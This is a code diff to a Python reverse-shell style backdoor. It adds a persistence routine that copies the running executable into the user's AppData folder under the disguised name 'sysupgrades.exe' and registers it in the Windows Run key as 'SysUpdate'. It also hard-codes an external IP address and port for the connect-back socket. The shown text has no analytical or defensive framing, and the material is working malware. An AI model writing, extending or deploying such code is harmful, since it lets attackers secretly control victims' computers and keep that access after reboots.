@@ -1,4 +1,7 @@
+import os
+import shutil
 import subprocess
+import sys
 import simplejson
 import socket
 
@@ -36,7 +39,16 @@ class Socket:
         self.connection.close()
 
 
-IPAddr = ""
+def add_persistence():
+    new_file = os.environ["appdata"] + "\\sysupgrades.exe"
+    if not os.path.exists(new_file):
+        shutil.copyfile(sys.executable, new_file)
+        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d " + new_file
+        subprocess.call(regedit_command, shell=True)
+
+
+add_persistence()
+IPAddr = "212.253.216.44"
 Port = 8080
 my_socket = Socket(IPAddr, Port)
 my_socket.start_socket()
